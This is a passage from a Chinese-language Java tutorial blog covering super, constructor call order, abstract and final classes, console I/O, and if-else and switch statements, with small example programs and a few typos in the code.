<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="number">2</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> age; <span class="comment">//静态属性               </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">human</span> <span class="keyword">extends</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> age; <span class="comment">//静态属性</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">               human.age=<span class="number">20</span>;</span><br><span class="line">               System.out.println(living.age);</span><br><span class="line">        &#125;   </span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-5-super的使用"><a href="#2-5-super的使用" class="headerlink" title="2.5  super的使用"></a><font color="#3CB371" face="Comic sans MS">2.5  super的使用</font></h4><p><font color="red" face="Comic sans MS">super：代表父类对象，在继承中有重要的作用</font><br><font face="Comic sans MS">📒<strong>使用情况：</strong><br>(1)  子类隐藏了超类中的变量或方法，而在程序中又要使用超类中被隐藏的变量或方法时<br><font color="red">&amp;emsp;&amp;emsp;格式：super.变量 ;  super.方法([参数表])</font><br>(2)  在子类的构造方法中引用超类的构造方法时<br><font color="red">&amp;emsp;&amp;emsp;格式： super([参数表])<br>📒<strong>注意:</strong>  构造方法不能被继承，但是子类的构造方法能确保它的直接父类<br>和间接父类的构造方法都被调用，但是注意一点：<strong>子类构造方法中调用父类构造方法时，调用语句必须放在子类构造方法中的第一句.</strong></font></font><br>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS"><br><strong>1.  📒使用super访问父类的属性和方法</strong><br><img data-src="https://i.loli.net/2018/12/26/5c232ab96c4be.png" alt="1.png"><br>&amp;emsp;<br>&amp;emsp;<br><strong>2.  📒使用super在子类中调用父类的构造方法</strong><br><img data-src="https://i.loli.net/2018/12/26/5c23311cb1dd4.png" alt="2.png"></p>
<p>&amp;emsp;<br><strong>3.  📒使用super的注意事项</strong><br>(1)通过super不仅可以访问直接父类中定义的属性和方法，还可以访问间接父类中定义的属性和方法。<br>(2)由于它指的是父类对象，所以super不能在static环境中使用，包括类变量、类方法和static语句块。<br>(3)使用super不能访问本类定义的属性和方法。<br>(4)在构造方法中使用super时，super语句必须放在第一句<br>(5)在子类的构造方法中，super可以不明确使用，也可以明确使用。<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><strong>4.  📒明确使用super调用父类构造方法</strong></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    Point（<span class="keyword">int</span> x）&#123;</span><br><span class="line">     <span class="keyword">this</span>.x=x;</span><br><span class="line">&#125;</span><br><span class="line">｝</span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MapPoint</span> <span class="keyword">extends</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">MapPoint()&#123;</span><br><span class="line">    <span class="keyword">super</span>(<span class="number">3</span>);  <span class="comment">//明确使用</span></span><br><span class="line">　System.out.println(<span class="string">&quot;MapPoint()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">　　<span class="keyword">new</span> MapPoint();</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">｝</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS"><strong>5.  📒不明确使用super调用父类构造方法</strong></font><br><font color="#FF6347">&amp;emsp;<strong>当父类重载自己的构造函数时，在子类的构造函数中要明确写出到底是使用父类的哪一个构造函数！！！否则编译器不知道在子类中到底是调用父类的哪一个构造方法！</strong><br></font></p>
<p><font color="red"><strong>如下:</strong></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    Point（<span class="keyword">int</span> x）&#123;</span><br><span class="line">     <span class="keyword">this</span>.x=x;</span><br><span class="line">&#125;</span><br><span class="line">｝</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MapPoint</span> <span class="keyword">extends</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">MapPoint()&#123;</span><br><span class="line">　System.out.println(<span class="string">&quot;MapPoint()&quot;</span>);</span><br><span class="line">　　&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">　　<span class="keyword">new</span> MapPoint();</span><br><span class="line">　　&#125;</span><br><span class="line">｝</span><br><span class="line"><span class="comment">//编译会出错</span></span><br></pre></td></tr></table></figure>

<p><font face="楷体">答案：因为子类中没有明确使用super，系统会自动在构造方法中加上super()，来调用直接父类的不带参数的构造方法，由于Point类中没有定义不带参数的构造方法，所以编译通不过。以上代码相当于：<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    Point（<span class="keyword">int</span> x）&#123;</span><br><span class="line">     <span class="keyword">this</span>.x=x;</span><br><span class="line">&#125;</span><br><span class="line">｝</span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MapPoint</span> <span class="keyword">extends</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">MapPoint()&#123;</span><br><span class="line">　<span class="keyword">super</span>(); <span class="comment">//此处不能缺省</span></span><br><span class="line">　System.out.println(<span class="string">&quot;MapPoint()&quot;</span>);</span><br><span class="line">　　&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">　　<span class="keyword">new</span> MapPoint();</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&amp;emsp;<br><strong>解决方法：</strong><br>(1)在MapPoint的构造方法中，明确使用super来调用父类已有的构造方法，如super(3);<br>(2)在Point中加入一个不带参数的构造方法，如Point{} 　　　　　<br>(3)去掉Point中全部的构造方法，则编译器会自动加入一个不带参数的构造方法，称为缺省构造方法。</p>
<p>&amp;emsp;<br><strong>6.  📒构造方法的调用顺序</strong><br><font color="red"><strong>一个复杂对象的构造方法调用顺序如下：</strong></font></p>
<p>(1)首先调用父类的构造方法。这个步骤会反复递归，使继承阶层的根源最先被构建，然后是次一层的子类，直至最末一层子类为止；（即先调用最根部的父类，然后依次调用该父类的子类的子类的……..）<br>(2)根据各个成员的声明顺序，执行成员变量的初始化赋值；<br>(3)执行该构造方法中的各语句</p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三、-抽象类与抽象方法abstract"><a href="#三、-抽象类与抽象方法abstract" class="headerlink" title="三、 抽象类与抽象方法abstract"></a><font color="#FF6347" face="Comic sans MS">三、 抽象类与抽象方法abstract</font></h3><p><font color="red" face="Comic sans MS"><strong>类似于它是一个模板！！！</strong></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">(1)abstract关键字修饰的类和方法
(2)抽象类不能创建任何对象，抽象类必须产生其子类，由子类创建对象。
(3)抽象类中可以包含抽象方法，也可以不包含抽象方法，但如果类中的某一方法是抽象的，整个类就必须被说
    明成抽象的。 
(4)抽象方法在子类中必须被实现，否则子类仍是抽象的。
(5)抽象类不是可有可无的。
(6)(类、成员方法、成员属性)访问权限修饰符为abstract。</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">17</span>]  抽象类举例</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Shape</span> </span></span><br><span class="line"><span class="class"></span>&#123;  <span class="function"><span class="keyword">abstract</span>  <span class="keyword">double</span>  <span class="title">area</span><span class="params">()</span></span>; </span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>; &#125;                                         </span><br><span class="line"> <span class="comment">//上述方法对一般图形无法定义其实现</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>  <span class="keyword">extends</span> <span class="title">Shape</span>  </span>&#123;</span><br><span class="line"><span class="keyword">int</span> width;                        </span><br><span class="line">       <span class="keyword">int</span> length;                       </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">area</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//矩型类实现了Shape类的抽象方法area()</span></span><br><span class="line">   <span class="keyword">return</span> width*length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span> <span class="params">()</span> </span>&#123;  … …     </span><br><span class="line"><span class="comment">//矩型类实现了Shape类的抽象方法draw()，详细可由自己完成&#125; </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四、-final类和final方法"><a href="#四、-final类和final方法" class="headerlink" title="四、 final类和final方法 "></a><font color="#FF6347" face="Comic sans MS">四、 final类和final方法 </font></h3><h4 id="4-1-final类"><a href="#4-1-final类" class="headerlink" title="4.1  final类"></a><font color="#3CB371" face="Comic sans MS">4.1  final类</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">如果一个类被final修饰符所修饰和限定，说明这个类不能被继承，即不可能有子类——最终类
             例如：*java.lang.System*
**📒作用：**
final修饰符通常是出于安全的目的而使用的，因为不能继承final类，人们就不能重载或覆盖它的任何方法。
如果允许一个类被继承，其允许被重载或覆盖的方法可能会被改写。保证某个特定的方法在类层次关系上
的某层以后只有一个定义，这对于那些安全性非常关键的类是非常必要的。</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="4-2-final方法"><a href="#4-2-final方法" class="headerlink" title="4.2  final方法"></a><font color="#3CB371" face="Comic sans MS">4.2  final方法</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">final修饰符所修饰的方法，是不能被子类所覆盖的方法。
📒**作用：**固定了这个方法所对应的具体操作，可以防止子类对父类关键
            方法的错误的重定义，保证了程序的安全性和正确性。
📒**注意：**所有已被private修饰符限定为私有的方法，以及所有包含在final类中的方法，都被默认为是
            final的。
            因为这些方法不可能被子类所继承，所以不可能被重载，自然都是最终的方法。
</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java简单语句、复合语句、控制语句(3.7-3.8)</title>
    <url>/post/Java-Language-2-3/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>简单语句和复合语句 & 控制语句</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一、-简单语句和复合语句"><a href="#一、-简单语句和复合语句" class="headerlink" title="一、 简单语句和复合语句 "></a><font color="#FF6347" face="Comic sans MS">一、 简单语句和复合语句 </font></h3><h4 id="1-1-变量定义语句"><a href="#1-1-变量定义语句" class="headerlink" title="1.1  变量定义语句"></a><font color="#3CB371" face="Comic sans MS">1.1  变量定义语句</font></h4><p><font face="Comic sans MS"> 变量定义语句用来定义一个变量，基本格式为：<br>&amp;emsp;&amp;emsp;<font color="red">            类型 变量名1, 变量名2…；</font><br>       例：char c&#x3D;‘a’;  int i,j&#x3D;1;<br></font></p>
<h4 id="1-2-赋值语句"><a href="#1-2-赋值语句" class="headerlink" title="1.2  赋值语句"></a><font color="#3CB371" face="Comic sans MS">1.2  赋值语句</font></h4><p><font face="Comic sans MS">  赋值语句是将表达式的值赋给变量，其格式为：<br>&amp;emsp;&amp;emsp;<font color="red">变量&#x3D;表达式；</font><br>      例： char c;  c&#x3D;‘a’;<br></font></p>
<h4 id="1-3-方法调用语句"><a href="#1-3-方法调用语句" class="headerlink" title="1.3  方法调用语句 "></a><font color="#3CB371" face="Comic sans MS">1.3  方法调用语句 </font></h4><p><font face="Comic sans MS"> 方法调用语句的一般形式为：<br>&amp;emsp;&amp;emsp;<font color="red">对象.方法名( 实参数列表 );</font><br>      例如  System.out.println(“Example!”);<br></font></p>
<h4 id="1-4-空语句"><a href="#1-4-空语句" class="headerlink" title="1.4  空语句 "></a><font color="#3CB371" face="Comic sans MS">1.4  空语句 </font></h4><p><font face="Comic sans MS"> 方法调用语句的一般形式为：<br>&amp;emsp;&amp;emsp;<font color="red">；&#x2F;&#x2F;这是一条空语句</font><br></font></p>
<h4 id="1-5-标准输入输出（I-x2F-O）"><a href="#1-5-标准输入输出（I-x2F-O）" class="headerlink" title="1.5  标准输入输出（I&#x2F;O） "></a><font color="#3CB371" face="Comic sans MS">1.5  标准输入输出（I&#x2F;O） </font></h4><p><font face="Comic sans MS">输入和输出是Java程序的重要组成部分,它提供了人机交互的手段，它们属于方法调用语句。<a href="https://directoree.top/post/Java-IO-1">具体使用方法参考本博客IO使用方法</a>。</p>
<p><font color="#00B2EE"><strong>1. 输入输出</strong></font><br>       输入是指把需要加工的数据放到程序中,read<br>       输出则把程序处理的结果呈现给用户,write<br><font color="#00B2EE"><strong>2. 标准输入输出</strong></font><br>       一般用键盘作为标准的输入设备<br>       显示器则是标准的输出设备<br><strong>通过System.in和System.out对象分别与键盘和显示器发生联系进行输入和输出。</strong><br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>📒1. 标准输出System.out对象</strong></font><br><font color="#00B2EE">System.out</font>对象中包含的最常用的方法是：<br><font color="#00B2EE">   print<strong>ln</strong>(参数)</font> 向标准输出设备(显示器)打印一行文本并换行<br><font color="#00B2EE">  print(参数)</font> 向标准输出设备(显示器)打印一行文本但不换行<br>   参数类型：boolean , char char[] ,double ,float ,int ,<br>                  long ,  Object,String </p>
<p>  例如：System.out.println(“Example”);<br>           System.out.print(“Input Name”);<br>           int x&#x3D;2; System.out.print(x);<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>📒2. 标准输入System.in对象</strong></font><br><font color="#00B2EE"><strong>System.in</strong></font>是字节流,作用是从标准输入读一个字节,常用的方法如下:<br><font color="red">   int read()</font>&amp;emsp;           从流中读取一个字节并将该字节作为整数返回,若没有数据则返回-1<br><font color="red">    int read(byte b[])</font>&amp;emsp; 从流中读取多个字节放到b中, 返回实际读取到的字节数<br><font color="red">   int read(byte b[],int off,int len)</font>&amp;emsp; 从流中读取最多len字节的数据, 放到数组b的下标off开始的单元中，返回读取到的字节数<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-1] ReadChar.java 从键盘读一个字符</span><br><span class="line">import java.io.*;</span><br><span class="line">public class ReadChar&#123;</span><br><span class="line">   public static void main(String args[])&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">         char ch=(char)System.in.read(); //将int转换为char</span><br><span class="line">         System.out.println(ch);    </span><br><span class="line">         &#125;catch(IOException e)&#123;&#125;</span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[例3-2] ReadString.java 从键盘读一串字符</span><br><span class="line">import java.io.*;    </span><br><span class="line">public class ReadString</span><br><span class="line">&#123; public static void main(String args[])</span><br><span class="line">     &#123;  char c;</span><br><span class="line">         try&#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">           &#123;  c=(char)System.in.read();  //使用循环来从输入流中读取一转字符</span><br><span class="line">              System.out.print(c);</span><br><span class="line">            &#125;<span class="keyword">while</span>(c!=<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">         &#125;catch(IOException e)&#123;  &#125;                    </span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[例3-3] ReadStringOrInt.java 从键盘读一数字串或一个整数</span><br><span class="line">import java.io.*;</span><br><span class="line">class ReadStringOrInt&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">	      byte buf[]=new byte[20];  </span><br><span class="line">	      String str;</span><br><span class="line">           int anInt;         </span><br><span class="line">	      try&#123;    </span><br><span class="line">               System.in.read(buf);  </span><br><span class="line">	          str=new String(buf)</span><br><span class="line">	          anInt=Integer.parseInt(str.trim()); </span><br><span class="line">	           &#125;</span><br><span class="line">	      catch(Exception e)&#123;  &#125; 	</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">//要将数字串转换成实数，则： </span><br><span class="line">  <span class="built_in">float</span>  f=Float.parseFloat(str.trim());        //转成单精度数</span><br><span class="line">  double d=Double.parseDouble(str.trim());      //转成双精度数  </span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>思考：如何接收用户向程序输入的参数?<br>通过System.in<br>通过main（String[] args）中的形参<br>class test{<br>public static void main(String[] args){<br>   System.out.println(args[0]);<br>   System.out.println(args[1]);<br>}<br>}<br>java test s1 s2<br>s1<br>s2</p>
</blockquote>
</blockquote>
<hr>
<hr>
<p>&amp;emsp;</p>
<h3 id="二、-控制语句句"><a href="#二、-控制语句句" class="headerlink" title="二、 控制语句句 "></a><font color="#FF6347" face="Comic sans MS">二、 控制语句句 </font></h3><ul>
<li>[ ]2.1选择语句<ul>
<li>2.1.1 if-else语句  </li>
<li>2.1.2 switch语句</li>
</ul>
</li>
<li>[ ]2.2循环语句 <ul>
<li>2.2.1 while 语句 </li>
<li>2.2.2 do-while 语句</li>
<li>2.2.3 for 语句</li>
<li>2.2.4 循环的嵌套</li>
</ul>
</li>
<li>[ ]2.3跳转语句  <ul>
<li>2.3.1 break语句</li>
<li>2.3.2 continue语句</li>
<li>2.3.3 return 语句</li>
</ul>
</li>
</ul>
<h4 id="2-1-选择语句"><a href="#2-1-选择语句" class="headerlink" title="2.1  选择语句"></a><font color="#3CB371" face="Comic sans MS">2.1  选择语句</font></h4><h5 id="if-else语句"><a href="#if-else语句" class="headerlink" title="  if-else语句"></a><font color="#00B2EE" face="Comic sans MS">  if-else语句</font></h5><p><font face="Comic sans MS"><font color="red"><strong>📒if-else语句的语法形式：</strong></font><br>       if  (布尔表达式)<br>         {    语句块1   }<br>       [ else<br>          {   语句块2      }  ]<br>     若语句块1，语句块2也是if-else语句便形成嵌套<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">例［<span class="number">3</span>-<span class="number">4</span>］：三个整数a,b,c，要求按从小到大的次序输出</span><br><span class="line">解题思路：对a,b,c进行排序。先找出a、b、c中最小的，然后比较剩下的两个。</span><br><span class="line">算法：    </span><br><span class="line">        ①如果a&gt;b，则将a和b互换（使得a是a、b中小的那个）</span><br><span class="line">        ②如果a&gt;c，则将a和c互换（使得a是a、b、c中最小的）</span><br><span class="line">        ③如果b&gt;c，则将b和c互换（最后c最大，b次之，a最小）</span><br><span class="line">代码如下：</span><br><span class="line">     <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">	&#123;</span><br><span class="line">          t=a;a=b;b=t;</span><br><span class="line">     &#125;</span><br><span class="line">	<span class="keyword">if</span>(a&gt;c)</span><br><span class="line">	&#123;</span><br><span class="line">          t=a;a=c;c=t;</span><br><span class="line">     &#125;</span><br><span class="line">	<span class="keyword">if</span>(b&gt;c)</span><br><span class="line">	&#123;</span><br><span class="line">          t=b;b=c;c=t;</span><br><span class="line">     &#125;</span><br><span class="line">    System.out.println(a+<span class="string">&quot;&lt; &quot;</span> +b+<span class="string">&quot;&lt; &quot;</span> +c);   </span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒  if–else 语句的嵌套**</font>    
if-else语句中内嵌的语句1或语句2又是if-else语句的情况称为if-else语句的嵌套。如：
      if（布尔表达式1）
           语句1
      else if（布尔表达式2）
                 语句2
                 …
             else if (布尔表达式m)
                        语句m
                    else  语句n
</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">3</span>-<span class="number">5</span>] 求一元二次方程(aX2+bX+c=<span class="number">0</span>)的根：</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">roots</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a,b,c;</span><br><span class="line">		<span class="keyword">float</span> x1,x2;</span><br><span class="line">		<span class="keyword">int</span> check;</span><br><span class="line">		a=<span class="number">1</span>;b=-<span class="number">2</span>;c=<span class="number">1</span>;</span><br><span class="line">		check=b*b-<span class="number">4</span>*a*c;</span><br><span class="line">		<span class="keyword">if</span>(check==<span class="number">0</span>)&#123;</span><br><span class="line">			x1=(-b)/(<span class="number">2</span>*a);</span><br><span class="line">			x2=x1;</span><br><span class="line">			System.out.println(<span class="string">&quot;x1=&quot;</span>+x1);</span><br><span class="line">			System.out.println(<span class="string">&quot;x2=&quot;</span>+x2);</span><br><span class="line">		&#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> (check&gt;<span class="number">0</span>) &#123;</span><br><span class="line">          x1=(-b+(<span class="keyword">float</span>)Math.sqrt(check))/(<span class="number">2</span>*a);</span><br><span class="line">          x2=(-b-(<span class="keyword">float</span>)Math.sqrt(check))/(<span class="number">2</span>*a);</span><br><span class="line">          System.out.println(<span class="string">&quot;x1=&quot;</span>+x1);</span><br><span class="line">          System.out.println(<span class="string">&quot;x2=&quot;</span>+x2);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;   <span class="comment">/*请自己填写*/</span>   &#125;</span><br><span class="line">     &#125; &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">课堂练习：求最小数</span><br><span class="line"><span class="keyword">import</span>  java.io.*;             </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Min</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123; </span><br><span class="line">   <span class="keyword">byte</span> buf[]=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">20</span>];  </span><br><span class="line">   String str ;  <span class="keyword">int</span> a, b, min;    </span><br><span class="line">   System.out.println(<span class="string">&quot;请输入二个整数：&quot;</span>);                    </span><br><span class="line">   System.in.read(buf);        <span class="comment">//从键盘读一数字串存于buf中</span></span><br><span class="line">   str=<span class="keyword">new</span> String(buf);              <span class="comment">//buf 转换成字符串 </span></span><br><span class="line">   a=Integer.parseInt(str.trim());  <span class="comment">//数字串转换成整数</span></span><br><span class="line">   System.in.read(buf);    str=<span class="keyword">new</span> String(buf);                   </span><br><span class="line">   b=Integer.parseInt(str.trim());        </span><br><span class="line">    </span><br><span class="line">   min=a;</span><br><span class="line">   <span class="keyword">if</span> (min&gt;b) min=b;</span><br><span class="line">   System.out.println(<span class="string">&quot;最小数是&quot;</span>+min);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h5 id="switch-语句"><a href="#switch-语句" class="headerlink" title="  switch  语句"></a><font color="#00B2EE" face="Comic sans MS">  switch  语句</font></h5><p><font face="Comic sans MS"><strong>switch语句根据表达式的结果来执行多个可能操作中的一个，它的语法形式如下：</strong><br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">case</span> 常量<span class="number">1</span>：语句<span class="number">1</span>  </span><br><span class="line">                [<span class="keyword">break</span>;]</span><br><span class="line"> <span class="keyword">case</span> 常量<span class="number">2</span>：语句<span class="number">2</span></span><br><span class="line">                [<span class="keyword">break</span>;]</span><br><span class="line"> …</span><br><span class="line"> <span class="keyword">case</span> 常量n：语句n</span><br><span class="line">                 [<span class="keyword">break</span>;]</span><br><span class="line"> [<span class="keyword">default</span>: 缺省处理语句</span><br><span class="line">                 <span class="keyword">break</span>；]    <span class="comment">//这儿的break语句不必要</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>注意：</strong></font> <font color="red">“case 常量”</font>只起语句标号的作用，并非在该处进行条件判断。在执行switch语句时，根据switch括号中表达式的值找到匹配的入口标号，就从此标号所标记的语句开始执行下去，<font color="red">不再进行判断，直到遇到break语句为止。</font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">演示有<span class="built_in">break</span>及没有<span class="built_in">break</span>的情况</span><br><span class="line">public class switchBreak</span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">     &#123;   …</span><br><span class="line">         switch(2)</span><br><span class="line">         &#123; </span><br><span class="line">          <span class="keyword">case</span> 1: System.out.println(<span class="string">&quot;case1&quot;</span>);</span><br><span class="line">                      <span class="built_in">break</span>;</span><br><span class="line">          <span class="keyword">case</span> 2: System.out.println(<span class="string">&quot;case2&quot;</span>);</span><br><span class="line">                      <span class="built_in">break</span>;</span><br><span class="line">          <span class="keyword">case</span> 3: System.out.println(<span class="string">&quot;case3&quot;</span>);</span><br><span class="line">                      <span class="built_in">break</span>;</span><br><span class="line">          default: System.out.println(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>使用switch-case必须注意:</strong></font><br><font color="#00B2EE"><strong>1.</strong></font> 表达式必须是符合byte,char,short和int类型的表达式,不能是浮点类型或字符串，case子句中常量的类型必须与表达式的类型相容,且每个常量必须不同；<br><font color="#00B2EE"><strong>2.</strong></font> case后面可以有多条语句，不用加{}；<br><font color="#00B2EE"><strong>3.</strong></font> default子句是可选的。如果有default，当表达式的值与case子句的值都不匹配时就会执行default分支，如果既没匹配也没default，那就什么也不执行；<br><font color="#00B2EE"><strong>4.</strong></font> break为跳转语句，表示跳出switch结构，即终止switch语句的执行。如果没有break语句，则switch在执行完一个case分支后，流程控制转移到下一个case继续执行，不再匹配，直到遇到break为止。<br><font color="#00B2EE"><strong>5.</strong></font> 多个case子句可以共享相同的语句块；<br><font color="#00B2EE"><strong>6.</strong></font> 通过if-else语句可以实现switch语句所有的功能。但通常使用switch语句更简练，且可读性强，程序的执行效率也高；<br><font color="#00B2EE"><strong>7.</strong></font> if-else语句可以基于一个范围内的值或一个条件来进行不同的操作，但switch语句中的每个case子句都必须对应一个单值。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-6] 用switch语句判断一个月份属于一年哪个季节(春、夏、秋、冬)。</span><br><span class="line">class SwitchDemo&#123;</span><br><span class="line"> public static void main(String args[]) &#123; </span><br><span class="line">  int month=7;</span><br><span class="line">  String season;</span><br><span class="line">  switch (month)     //值为12、1和2时将都执行：season=<span class="string">&quot;冬季&quot;</span>; <span class="built_in">break</span>;</span><br><span class="line">  &#123; <span class="keyword">case</span>  12: </span><br><span class="line">    <span class="keyword">case</span>  1:</span><br><span class="line">    <span class="keyword">case</span>  2:</span><br><span class="line">      season=<span class="string">&quot;冬季&quot;</span>;  </span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">    <span class="keyword">case</span>  3:</span><br><span class="line">    <span class="keyword">case</span>  4:</span><br><span class="line">    <span class="keyword">case</span>  5:</span><br><span class="line">      season=<span class="string">&quot;春季&quot;</span>；</span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">   <span class="keyword">case</span>  6:</span><br><span class="line">   <span class="keyword">case</span>  7:</span><br><span class="line">   <span class="keyword">case</span>  8:  season=<span class="string">&quot;夏季&quot;</span>; </span><br><span class="line">                 <span class="built_in">break</span>;</span><br><span class="line">   <span class="keyword">case</span>  9:</span><br><span class="line">   <span class="keyword">case</span>  10:</span><br><span class="line">   <span class="keyword">case</span>  11: season=<span class="string">&quot;秋季&quot;</span>；</span><br><span class="line">                 <span class="built_in">break</span>;</span><br><span class="line">   default:  season=<span class="string">&quot;错!&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   System.out.println(<span class="string">&quot;月份    季节&quot;</span>);</span><br><span class="line">   System.out.println(month+<span class="string">&quot;    &quot;</span>+season);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">该程序运行后输出：月份    季节</span><br><span class="line">                 7      